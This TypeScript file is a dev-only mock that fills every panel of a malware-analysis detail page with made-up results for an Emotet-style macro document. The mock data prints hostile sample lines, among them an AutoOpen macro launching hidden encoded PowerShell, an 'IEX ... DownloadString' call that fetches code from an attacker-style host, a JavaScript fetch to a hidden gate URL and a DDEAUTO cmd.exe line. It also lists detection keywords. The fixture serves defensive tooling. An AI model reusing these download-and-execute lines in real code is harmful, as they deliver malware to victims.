/**
 * Dev-only "everything at once" analysis.
 *
 * Purpose: the detail page has a lot of conditional surface — tabs that hide when
 * empty, panels that only appear with detonation, VirusTotal sections that depend
 * on what VT happened to know. No real sample exercises all of it at the same
 * time, so reviewing a layout change meant hunting for a job that happened to have
 * the block you touched. This fixture populates every branch at once.
 *
 * Open it at /file-analysis/mock-full. Turn it off with the MOCK_ANALYSIS_ENABLED
 * constant below — nothing needs deleting.
 *
 * It lives next to the components it feeds rather than in src/dev/, so the fixture
 * is found by whoever is editing the page it describes. It stays dev-only through
 * USE_MOCK_ANALYSIS, not through where it sits.
 */

import type { FileAnalysisJob, FileAnalysisResult } from "@/types/file-analysis"

/**
 * The switch. Set to false to turn the fixture off without removing any code —
 * the mock job id then falls through to the normal API path like any other id.
 */
const MOCK_ANALYSIS_ENABLED = true

/**
 * Guarded by DEV as well, so the fixture cannot serve data from a production
 * build even if this file is left enabled.
 */
export const USE_MOCK_ANALYSIS = import.meta.env.DEV && MOCK_ANALYSIS_ENABLED

/** Job id that switches the detail view onto this fixture instead of the API. */
/**
 * How long the fixture pretends to load, so the skeleton and the progress panel
 *  are actually on screen while reviewing this page.
 */
export const MOCK_LATENCY_MS = 900

export const MOCK_JOB_ID = "mock-full"

const SHA = "9f2b8c1d4e6a7b3c5d8e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c"

export function mockJob(): FileAnalysisJob {
	return {
		job_id: MOCK_JOB_ID,
		sha256: SHA,
		filename: "invoice_statement_2026.docm",
		customer_code: "00001",
		source: "host_path",
		status: "done",
		static_status: "done",
		dynamic_status: "done",
		sandbox_enabled: true,
		hardened: true,
		verdict: "malicious",
		created_at: new Date(Date.now() - 3600_000).toISOString(),
		updated_at: new Date().toISOString(),
		error: null
	}
}

export function mockResult(): FileAnalysisResult {
	return {
		job: mockJob(),
		preview_urls: ["page-1.png", "page-2.png", "page-3.png"],
		verdict_reason:
			"static: macro auto-executes and drops a PE (T1204.002, T1059.005); sandbox: malscore 9.4 with an " +
			"extracted Emotet config and a live C2; VirusTotal 46/72 — the three tiers agree.",
		inspector: {
			sha256: SHA,
			filename: "invoice_statement_2026.docm",
			customer_code: "00001",
			filetype: "office",
			magic: "Microsoft Word 2007+ (DOCM, macro-enabled), 148 KB",
			extension_mismatch: true,
			entropy: 7.42,
			hardened: true,
			analysis_incomplete: false,
			verdict_hint: "malicious",
			av: { engine: "ClamAV", signature: "Doc.Downloader.Emotet-9912345-0" },
			previews: ["page-1.png", "page-2.png", "page-3.png"],
			flags: [
				"malicious_behavior",
				"macro_autoexec",
				"extension_mismatch",
				"obfuscated_script",
				"html_smuggling"
			],
			hashes: {
				sha256: SHA,
				sha1: "3a7f1c9e2b4d6a8c0e1f3a5b7c9d1e3f5a7b9c1d",
				md5: "b1946ac92492d2347c6235b4d2611184",
				imphash: "d41d8cd98f00b204e9800998ecf8427e"
			},
			iocs: {
				urls: [
					"http://cdn.delivery-invoice[.]top/gate.php",
					"https://185.234.219.14/panel/upload",
					"http://updates.contoso-cdn[.]net/win/patch.bin"
				],
				ips: ["185.234.219.14", "45.132.192.7", "91.219.236.102"],
				domains: ["delivery-invoice.top", "contoso-cdn.net", "mail.mimecast-secure.co"]
			},
			content: {
				raw: 'Sub AutoOpen()\n  Dim s As String\n  s = "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA..."\n  Shell s, vbHide\nEnd Sub',
				deobfuscated:
					'IEX (New-Object Net.WebClient).DownloadString("http://cdn.delivery-invoice.top/gate.php")',
				deobfuscated_layers: [
					"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...",
					'IEX (New-Object Net.WebClient).DownloadString("http://cdn.delivery-invoice.top/gate.php")'
				],
				macros:
					'Attribute VB_Name = "NewMacros"\nSub AutoOpen()\n  Call Stage2\nEnd Sub\n\nPrivate Sub Stage2()\n  CreateObject("WScript.Shell").Run Decode(payload), 0, False\nEnd Sub',
				autoexec_keywords: ["AutoOpen", "Document_Open", "Workbook_Open"],
				suspicious_keywords: ["Shell", "CreateObject", "WScript.Shell", "DownloadString", "powershell"],
				dde: "DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe",
				javascript: 'var a = atob("aHR0cDovL2Nkbi5kZWxpdmVyeS1pbnZvaWNlLnRvcC9nYXRlLnBocA==");\nfetch(a);',
				text: "INVOICE 2026-0041\nPlease enable content to view the protected document.\nAmount due: EUR 4.812,00",
				target: "C:\\Windows\\System32\\cmd.exe",
				arguments: "/c powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
				working_dir: "C:\\Users\\jdoe\\AppData\\Local\\Temp",
				icon_location: "C:\\Windows\\System32\\shell32.dll,3",
				structure: { streams: 7, storages: 2, macros: 3 },
				pdf_metadata: { Producer: "Microsoft Word", Author: "billing", CreationDate: "2026-08-11" },
				imports: ["kernel32.dll", "advapi32.dll", "wininet.dll", "ole32.dll"],
				import_count: 4,
				signature_present: false,
				capabilities: [
					"executes a shell command",
					"downloads a file over HTTP",
					"writes to the Run key",
					"queries the system language",
					"enumerates running processes"
				],
				sections: [
					{ name: ".text", vsize: 81_920, rawsize: 81_408, entropy: 6.61 },
					{ name: ".rdata", vsize: 28_672, rawsize: 28_160, entropy: 5.12 },
					{ name: ".data", vsize: 12_288, rawsize: 4096, entropy: 3.74 },
					{ name: ".rsrc", vsize: 40_960, rawsize: 40_448, entropy: 7.93 }
				],
				strings: [
					"http://cdn.delivery-invoice.top/gate.php",
					"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
					"powershell.exe -w hidden -enc",
					"Global\\M8f1a2b3c",
					"%APPDATA%\\Microsoft\\Windows\\svchost32.exe",
					"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
				],
				behaviors: [
					{
						attack_id: "T1204.002",
						technique: "User execution — malicious file",
						severity: "malicious",
						evidence: "AutoOpen macro runs on document open"
					},
					{
						attack_id: "T1059.001",
						technique: "PowerShell",
						severity: "malicious",
						evidence: "powershell -w hidden -enc <base64>"
					},
					{
						attack_id: "T1547.001",
						technique: "Registry Run key persistence",
						severity: "suspicious",
						evidence: "writes svchost32.exe to CurrentVersion\\Run"
					}
				]
			}
		},
		sandbox: {
			task_id: 4711,
			malscore: 9.4,
			verdict: "malicious",
			family: "Emotet",
			machine: "capewin",
			duration: 214,
			package: "doc",
			c2_ips: ["185.234.219.14", "45.132.192.7"],
			c2_domains: ["delivery-invoice.top"],
			hosts: ["185.234.219.14", "45.132.192.7", "20.42.65.92", "8.8.8.8", "8.8.8.8"],
			domains: ["delivery-invoice.top", "settings-win.data.microsoft.com", "ctldl.windowsupdate.com"],
			dns: [
				{ request: "delivery-invoice.top", type: "A", answers: ["185.234.219.14"] },
				{ request: "ctldl.windowsupdate.com", type: "A", answers: ["93.184.221.240"] },
				{ request: "settings-win.data.microsoft.com", type: "A", answers: ["20.42.65.92"] }
			],
			http: [
				{ method: "POST", host: "delivery-invoice.top", uri: "/gate.php" },
				{ method: "GET", host: "delivery-invoice.top", uri: "/win/patch.bin" },
				{ method: "GET", host: "ctldl.windowsupdate.com", uri: "/msdownload/update/v3/static/trustedr/en" }
			],
			connections: [
				{ proto: "tcp", dst: "185.234.219.14", dport: 443 },
				{ proto: "tcp", dst: "185.234.219.14", dport: 443 },
				{ proto: "tcp", dst: "185.234.219.14", dport: 80 },
				{ proto: "udp", dst: "8.8.8.8", dport: 53 },
				{ proto: "udp", dst: "8.8.8.8", dport: 53 },
				{ proto: "udp", dst: "8.8.8.8", dport: 53 },
				{ proto: "tcp", dst: "20.42.65.92", dport: 443 }
			],
			ttps: [
				{ id: "T1204.002", signature: "user executed a malicious document" },
				{ id: "T1059.001", signature: "powershell with encoded command" },
				{ id: "T1547.001", signature: "registry run key persistence" },
				{ id: "T1082", signature: "system information discovery" },
				{ id: "T1082", signature: "queries the installed language" },
				{ id: "T1071.001", signature: "web protocols for C2" }
			],
			signatures: [
				{
					name: "emotet_config_extraction",
					description: "Extracted an Emotet configuration block with two C2 endpoints",
					severity: 5,
					mitre: ["T1071.001"]
				},
				{
					name: "office_macro_autoexec",
					description: "Document runs a macro without user interaction",
					severity: 4,
					mitre: ["T1204.002"]
				},
				{
					name: "persistence_autorun",
					description: "Writes an executable to the Run key",
					severity: 4,
					mitre: ["T1547.001"]
				},
				{
					name: "pe_tls_callbacks",
					description: "PE declares TLS callbacks",
					severity: 2,
					low_confidence: true
				},
				{
					name: "packer_entropy",
					description: "Section entropy suggests packing",
					severity: 2,
					low_confidence: true
				},
				{
					name: "queries_keyboard_layout",
					description: "Reads the guest keyboard layout",
					severity: 1,
					noise: true
				},
				{
					name: "creates_suspended_process",
					description: "CAPE's own monitor injecting its analysis DLL",
					severity: 2,
					noise: true
				}
			],
			processes: [
				{ name: "WINWORD.EXE", pid: 3120, ppid: 812, command_line: '"C:\\Program Files\\Office\\WINWORD.EXE" /n invoice_statement_2026.docm' },
				{ name: "cmd.exe", pid: 4408, ppid: 3120, command_line: "cmd /c powershell -w hidden -enc SQBFAFgA..." },
				{ name: "powershell.exe", pid: 5012, ppid: 4408, command_line: "powershell -w hidden -enc SQBFAFgA..." },
				{ name: "svchost32.exe", pid: 5644, ppid: 5012, command_line: "%APPDATA%\\Microsoft\\Windows\\svchost32.exe" },
				{ name: "rundll32.exe", pid: 6120, ppid: 5644, command_line: "rundll32.exe shell32.dll,Control_RunDLL" }
			],
			payloads: [
				{ name: "stage2.bin", sha256: "1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d", type: "PE32 executable" },
				{ name: "config.json", sha256: "2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e", type: "extracted config" }
			],
			dropped: [
				{ name: "svchost32.exe", sha256: "3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f", type: "PE32 executable" },
				{ name: "tmp8f1a.tmp", sha256: "4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a", type: "data" },
				{ name: "settings.dat", sha256: "5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b" }
			],
			screenshots: [],
			errors: ["Monitor injection attempted but failed for process 6120"],
			dead_hosts: ["45.132.192.7:8080", "91.219.236.102:443"],
			behavior: {
				files: ["C:\\Users\\jdoe\\AppData\\Local\\Temp\\tmp8f1a.tmp"],
				write_files: ["%APPDATA%\\Microsoft\\Windows\\svchost32.exe"],
				delete_files: ["C:\\Users\\jdoe\\AppData\\Local\\Temp\\~$voice.docm"],
				registry_keys: ["HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"],
				write_keys: ["HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost32"],
				mutexes: ["Global\\M8f1a2b3c"],
				executed_commands: ["cmd /c powershell -w hidden -enc SQBFAFgA..."],
				created_services: [],
				resolved_apis: ["VirtualAlloc", "CreateRemoteThread", "InternetOpenUrlA"]
			},
			enhanced: [
				{ event: "file_written", object: "%APPDATA%\\Microsoft\\Windows\\svchost32.exe" },
				{ event: "registry_written", object: "HKCU\\...\\Run\\svchost32" },
				{ event: "connection", object: "185.234.219.14:443" }
			]
		},
		reputation: {
			source: "virustotal",
			found: true,
			sha256: SHA,
			malicious: 46,
			suspicious: 3,
			total: 72,
			family: "Emotet",
			meaningful_name: "invoice_statement_2026.docm",
			permalink: `https://www.virustotal.com/gui/file/${SHA}`,
			submitted: false,
			intel: {
				threat_label: "trojan.emotet/heurdownloader",
				threat_categories: ["trojan", "downloader"],
				threat_names: ["Emotet", "Heur.Downloader", "W97M.Downloader"],
				type_description: "Office Open XML Document (macro-enabled)",
				size: 151_552,
				reputation: -37,
				harmless_votes: 1,
				malicious_votes: 24,
				times_submitted: 118,
				first_seen: "2026-08-11T09:14:00Z",
				last_analysis: "2026-08-25T18:02:00Z",
				signed: false,
				names: ["invoice_statement_2026.docm", "INVOICE-0041.docm", "statement.docm"],
				detection_count: 46,
				detections: [
					{ engine: "Microsoft", result: "TrojanDownloader:O97M/Emotet.SVK!MTB", category: "malicious" },
					{ engine: "Kaspersky", result: "HEUR:Trojan-Downloader.MSOffice.SLoad.gen", category: "malicious" },
					{ engine: "ESET-NOD32", result: "VBA/TrojanDownloader.Agent.WQ", category: "malicious" },
					{ engine: "Sophos", result: "Troj/DocDl-AGRT", category: "malicious" },
					{ engine: "CrowdStrike", result: "win/malicious_confidence_100%", category: "malicious" },
					{ engine: "Fortinet", result: "VBA/Agent.WQ!tr.dldr", category: "malicious" },
					{ engine: "TrendMicro", result: "Trojan.W97M.EMOTET.SMJ", category: "malicious" },
					{ engine: "Avast", result: "Other:Malware-gen [Trj]", category: "malicious" },
					{ engine: "Zillya", result: "Downloader.Agent.Script.2145", category: "suspicious" },
					{ engine: "Jiangmin", result: "Heur.Macro.Agent.a", category: "suspicious" }
				],
				yara: [
					{
						rule: "Emotet_Doc_Dropper",
						author: "enzok",
						ruleset: "CAPE",
						description: "Emotet maldoc dropper stage 1"
					},
					{
						rule: "Office_AutoOpen_Shell",
						author: "ditekshen",
						ruleset: "crowdsourced",
						description: "Office document auto-executing a shell command"
					},
					{
						rule: "Base64_PowerShell_Encoded",
						author: "malpedia",
						ruleset: "crowdsourced",
						description: "Encoded PowerShell command line"
					},
					{ rule: "SUSP_Macro_Obfuscation", ruleset: "signature-base" }
				],
				sigma: [
					{
						title: "Office application spawning a command shell",
						level: "high",
						source: "sigma-community"
					},
					{ title: "Encoded PowerShell command line", level: "high", source: "sigma-community" },
					{ title: "Registry Run key persistence", level: "medium", source: "sigma-community" },
					{ title: "Suspicious parent-child process chain", level: "low", source: "internal" }
				],
				ids: [
					{
						msg: "ET MALWARE Emotet CnC Checkin",
						severity: "high",
						category: "trojan-activity",
						source: "Suricata/ET Open"
					},
					{
						msg: "ET INFO Windows Executable Download From Dotted-Quad Host",
						severity: "medium",
						category: "policy-violation",
						source: "Suricata/ET Open"
					},
					{ msg: "ET POLICY PE EXE download over HTTP", severity: "low", source: "Snort" }
				],
				behaviour: {
					tags: ["persistence", "downloader", "macro"],
					mitre: [
						{ id: "T1204.002", description: "user execution of a malicious file", severity: "high" },
						{ id: "T1059.001", description: "command and scripting interpreter: PowerShell" },
						{ id: "T1027", description: "encode data using Base64" },
						{ id: "T1547.001", description: "registry run key persistence" },
						{ id: "T1082", description: "system information discovery" },
						{ id: "T1082", description: "identify the system language" },
						{ id: "T1071.001", description: "application layer protocol: web protocols" }
					],
					contacted_ips: ["185.234.219.14", "45.132.192.7", "20.42.65.92"],
					contacted_domains: ["delivery-invoice.top", "ctldl.windowsupdate.com"],
					contacted_urls: [
						"http://cdn.delivery-invoice.top/gate.php",
						"http://cdn.delivery-invoice.top/win/patch.bin"
					],
					dropped_files: [
						{ name: "svchost32.exe", type: "PE32 executable", sha256: "3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b" },
						{ name: "tmp8f1a.tmp", type: "data", sha256: "4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c" },
						{ name: "settings.dat", type: "data" }
					],
					processes: ["WINWORD.EXE", "cmd.exe", "powershell.exe", "svchost32.exe", "rundll32.exe"],
					registry_keys: [
						"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
						"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language"
					],
					mutexes: ["Global\\M8f1a2b3c", "Local\\ZonesCacheCounterMutex"]
				}
			}
		}
	}
}

/**
 * Preview images are normally fetched as authenticated blobs. The fixture has no
 * server side, so it draws its own pages on a canvas — the Preview tab then
 * exercises its real load/revoke path instead of being skipped.
 */
export function mockPreview(name: string): Promise<Blob> {
	const canvas = document.createElement("canvas")
	canvas.width = 620
	canvas.height = 877
	const ctx = canvas.getContext("2d")
	if (ctx) {
		ctx.fillStyle = "#f4f4f2"
		ctx.fillRect(0, 0, canvas.width, canvas.height)
		ctx.fillStyle = "#c8c8c4"
		for (let i = 0; i < 26; i++) {
			const w = 380 + ((i * 37) % 160)
			ctx.fillRect(70, 150 + i * 24, w, 9)
		}
		ctx.fillStyle = "#1f1f1f"
		ctx.font = "bold 30px sans-serif"
		ctx.fillText("INVOICE 2026-0041", 70, 90)
		ctx.font = "16px sans-serif"
		ctx.fillStyle = "#8a8a86"
		ctx.fillText(`mock preview · ${name}`, 70, 120)
	}
	return new Promise(resolve => canvas.toBlob(b => resolve(b ?? new Blob()), "image/png"))
}
